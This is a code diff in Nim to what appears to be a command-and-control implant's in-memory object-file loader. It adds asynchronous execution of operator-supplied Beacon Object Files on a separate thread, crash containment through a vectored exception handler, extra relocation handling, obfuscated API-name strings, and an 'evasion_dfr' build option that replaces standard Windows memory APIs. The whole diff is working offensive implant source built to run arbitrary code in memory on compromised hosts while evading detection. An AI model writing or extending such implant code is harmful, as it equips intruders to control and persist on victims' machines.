@@ -4,7 +4,11 @@ import ../global_data
 
 when defined(windows):
   import base64, strutils
-  import winim/lean
+  when defined(evasion_dfr):
+    import winim/lean except VirtualAlloc, VirtualFree, VirtualProtect
+    import ../utils/winapi
+  else:
+    import winim/lean
   import ../utils/[structs, beacon_functions, ptr_math]
   
   type
@@ -14,6 +18,40 @@ when defined(windows):
       bof_arguments: string
     
     COFFEntry = proc(args: ptr byte, argssize: uint32) {.stdcall.}
+
+    BofThreadParams = object
+      entryAddr: uint64
+      argsPtr: pointer
+      argsLen: uint32
+
+    ActiveBofSession* = object
+      taskId*: string
+      hThread*: HANDLE
+      allocatedMemory*: pointer        # COFF mapped memory — freed after thread completes
+      argsBuffer*: pointer             # allocShared'd argument buffer — freed after thread completes
+      argsBufferLen*: int
+      threadParams*: ptr BofThreadParams  # allocShared'd — freed after thread completes
+      preOutput*: string               # Output collected before thread spawn (parsing, relocation messages)
+
+  var activeBofSessions*: seq[ActiveBofSession] = @[]
+
+  # Module-level flag for VEH crash detection (stdcall procs cannot capture locals)
+  var bofCrashedFlag: LONG = 0
+
+  proc bofVehHandler(info: ptr EXCEPTION_POINTERS): LONG {.stdcall.} =
+    # Flag the crash and terminate just this thread (not the process)
+    bofCrashedFlag = cast[LONG](info.ExceptionRecord.ExceptionCode)
+    ExitThread(cast[DWORD](info.ExceptionRecord.ExceptionCode))
+    return EXCEPTION_CONTINUE_SEARCH  # unreachable, but satisfies return type
+
+  proc bofThreadProc(param: LPVOID): DWORD {.stdcall.} =
+    let p = cast[ptr BofThreadParams](param)
+    let entryPtr = cast[COFFEntry](p.entryAddr)
+    let vehHandle = AddVectoredExceptionHandler(1, bofVehHandler)
+    entryPtr(cast[ptr byte](p.argsPtr), p.argsLen)
+    if vehHandle != nil:
+      discard RemoveVectoredExceptionHandler(vehHandle)
+    return 0
 
   proc hexStringToByteArray(hexString: string): seq[byte] =
     result = @[]
@@ -51,6 +89,24 @@ when defined(windows):
       for i in 0..22:
         if symbolWithoutPrefix == functionAddresses[i].name:
           return functionAddresses[i].address
+      return 0
+    
+    # Handle __C_specific_handler (needed for BOFs compiled with /EHa)
+    if symbolWithoutPrefix == obf("__C_specific_handler") or symbolName == obf("__C_specific_handler"):
+      var kernelName = obf("kernel32.dll")
+      let kern = GetModuleHandleA(addr kernelName[0])
+      if kern != 0:
+        var funcName = obf("__C_specific_handler")
+        let funcAddr = cast[uint64](GetProcAddress(kern, addr funcName[0]))
+        if funcAddr != 0:
+          return funcAddr
+      var ntdllName = obf("ntdll.dll")
+      let ntdll = GetModuleHandleA(addr ntdllName[0])
+      if ntdll != 0:
+        var funcName = obf("__C_specific_handler")
+        let funcAddr = cast[uint64](GetProcAddress(ntdll, addr funcName[0]))
+        if funcAddr != 0:
+          return funcAddr
       return 0
     
     try:
@@ -100,6 +156,16 @@ when defined(windows):
     case givenType
     of IMAGE_REL_AMD64_REL32:
       add32(cast[ptr uint8](patchAddress), cast[uint32](sectionStartAddress + cast[uint64](symbolOffset) - patchAddress - 4))
+    of IMAGE_REL_AMD64_REL32_1:
+      add32(cast[ptr uint8](patchAddress), cast[uint32](sectionStartAddress + cast[uint64](symbolOffset) - patchAddress - 4 - 1))
+    of IMAGE_REL_AMD64_REL32_2:
+      add32(cast[ptr uint8](patchAddress), cast[uint32](sectionStartAddress + cast[uint64](symbolOffset) - patchAddress - 4 - 2))
+    of IMAGE_REL_AMD64_REL32_3:
+      add32(cast[ptr uint8](patchAddress), cast[uint32](sectionStartAddress + cast[uint64](symbolOffset) - patchAddress - 4 - 3))
+    of IMAGE_REL_AMD64_REL32_4:
+      add32(cast[ptr uint8](patchAddress), cast[uint32](sectionStartAddress + cast[uint64](symbolOffset) - patchAddress - 4 - 4))
+    of IMAGE_REL_AMD64_REL32_5:
+      add32(cast[ptr uint8](patchAddress), cast[uint32](sectionStartAddress + cast[uint64](symbolOffset) - patchAddress - 4 - 5))
     of IMAGE_REL_AMD64_ADDR32NB:
       add32(cast[ptr uint8](patchAddress), cast[uint32](sectionStartAddress - patchAddress - 4))
     of IMAGE_REL_AMD64_ADDR64:
@@ -120,7 +186,10 @@ when defined(windows):
       relocationCursor += 1
     result *= cast[uint64](sizeof(ptr uint64))
 
-  proc runCOFF(functionName: string, fileBuffer: seq[byte], argumentBuffer: seq[byte]): (bool, string) =
+  proc runCOFF(taskId: string, functionName: string, fileBuffer: seq[byte], argumentBuffer: seq[byte]): (bool, string) =
+    ## Parse COFF, apply relocations, spawn BOF thread, and return immediately.
+    ## The BOF runs asynchronously — poll via checkActiveBofSessions().
+    ## Returns (false, error) on setup failure, or (true, "processing") on successful thread spawn.
     var output = ""
     let fileHeader = cast[ptr FileHeader](unsafeAddr fileBuffer[0])
     var totalSize: uint64 = 0
@@ -204,20 +273,107 @@ when defined(windows):
     
     output.add(obf("[+] Entrypoint found, executing...\n"))
     
-    let entryPtr = cast[COFFEntry](entryAddr)
-    if argumentBuffer.len == 0:
-      entryPtr(nil, 0)
-    else:
-      entryPtr(unsafeAddr argumentBuffer[0], cast[uint32](argumentBuffer.len))
+    # Allocate persistent memory for thread params and args (must outlive this function)
+    var sharedArgs: pointer = nil
+    if argumentBuffer.len > 0:
+      sharedArgs = allocShared(argumentBuffer.len)
+      copyMem(sharedArgs, unsafeAddr argumentBuffer[0], argumentBuffer.len)
     
-    output.add(obf("[+] BOF execution completed\n"))
+    var tp = cast[ptr BofThreadParams](allocShared0(sizeof(BofThreadParams)))
+    tp.entryAddr = entryAddr
+    tp.argsPtr = sharedArgs
+    tp.argsLen = cast[uint32](argumentBuffer.len)
     
-    let outData = BeaconGetOutputData(nil)
-    if outData != nil:
-      output.add(obf("\n=== BOF Output ===\n") & $outData & obf("\n==================\n"))
+    bofCrashedFlag = 0
+    var threadId: DWORD
+    let hThread = CreateThread(nil, 0, bofThreadProc, tp, 0, addr threadId)
+    if hThread == 0:
+      if sharedArgs != nil: deallocShared(sharedArgs)
+      deallocShared(tp)
+      discard VirtualFree(allocatedMemory, 0, MEM_RELEASE)
+      return (false, obf("[!] Failed to create BOF execution thread"))
     
-    discard VirtualFree(allocatedMemory, 0, MEM_RELEASE)
-    return (true, output)
+    # Store session for async polling — DO NOT wait here
+    activeBofSessions.add(ActiveBofSession(
+      taskId: taskId,
+      hThread: hThread,
+      allocatedMemory: allocatedMemory,
+      argsBuffer: sharedArgs,
+      argsBufferLen: argumentBuffer.len,
+      threadParams: tp,
+      preOutput: output
+    ))
+    
+    return (true, "")
+
+  proc cleanupBofSession(session: ActiveBofSession) =
+    CloseHandle(session.hThread)
+    if session.argsBuffer != nil:
+      deallocShared(session.argsBuffer)
+    deallocShared(session.threadParams)
+    discard VirtualFree(session.allocatedMemory, 0, MEM_RELEASE)
+
+  proc checkActiveBofSessions*(): seq[JsonNode] =
+    ## Non-blocking poll of running BOF threads.
+    ## Called each main loop iteration. Returns completed task responses.
+    result = @[]
+    var completedIndices: seq[int] = @[]
+    
+    for i in 0..<activeBofSessions.len:
+      let session = activeBofSessions[i]
+      # Non-blocking check: timeout=0 returns immediately
+      let waitResult = WaitForSingleObject(session.hThread, 0)
+      
+      if waitResult == WAIT_OBJECT_0:
+        # Thread finished
+        var output = session.preOutput
+        
+        if bofCrashedFlag != 0:
+          output.add(obf("[!] BOF crashed with exception code: 0x") & toHex(cast[uint32](bofCrashedFlag)) & obf("\n"))
+          bofCrashedFlag = 0
+        else:
+          var exitCode: DWORD
+          GetExitCodeThread(session.hThread, addr exitCode)
+          if exitCode != 0:
+            output.add(obf("[!] BOF exited with non-zero code: 0x") & toHex(exitCode) & obf("\n"))
+          else:
+            output.add(obf("[+] BOF execution completed\n"))
+        
+        let outData = BeaconGetOutputData(nil)
+        if outData != nil:
+          output.add(obf("\n=== BOF Output ===\n") & $outData & obf("\n==================\n"))
+        
+        cleanupBofSession(session)
+        completedIndices.add(i)
+        
+        result.add(%*{
+          obf("task_id"): session.taskId,
+          obf("completed"): true,
+          obf("status"): obf("success"),
+          obf("user_output"): output
+        })
+      
+      elif waitResult == WAIT_TIMEOUT:
+        # Still running — do nothing
+        discard
+      
+      else:
+        # Error — clean up
+        var output = session.preOutput
+        output.add(obf("[!] Unexpected error waiting for BOF thread\n"))
+        cleanupBofSession(session)
+        completedIndices.add(i)
+        
+        result.add(%*{
+          obf("task_id"): session.taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): output
+        })
+    
+    # Remove completed sessions (reverse order to preserve indices)
+    for i in countdown(completedIndices.len - 1, 0):
+      activeBofSessions.delete(completedIndices[i])
 
 const CHUNK_SIZE = 512000
 
@@ -262,13 +418,15 @@ proc processInlineExecuteChunk*(taskId: string, params: JsonNode, chunkData: str
         if argumentBuffer.len == 0 and args.bof_arguments.len > 0:
           return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("[!] Error parsing arguments")}
       
-      let (success, bofOutput) = runCOFF(args.bof_entrypoint, fileData, argumentBuffer)
-      output.add(bofOutput)
+      let (success, bofOutput) = runCOFF(taskId, args.bof_entrypoint, fileData, argumentBuffer)
       
       if not success:
+        output.add(bofOutput)
         return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): output}
       
-      return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): obf("success"), obf("user_output"): output}
+      # BOF thread spawned successfully — return "processing" so the agent stays responsive.
+      # checkActiveBofSessions() will report completion on subsequent loop iterations.
+      return %*{obf("task_id"): taskId, obf("completed"): false, obf("status"): obf("processing"), obf("user_output"): output}
     except Exception as e:
       return %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("Failed to execute BOF: ") & e.msg}
   else:
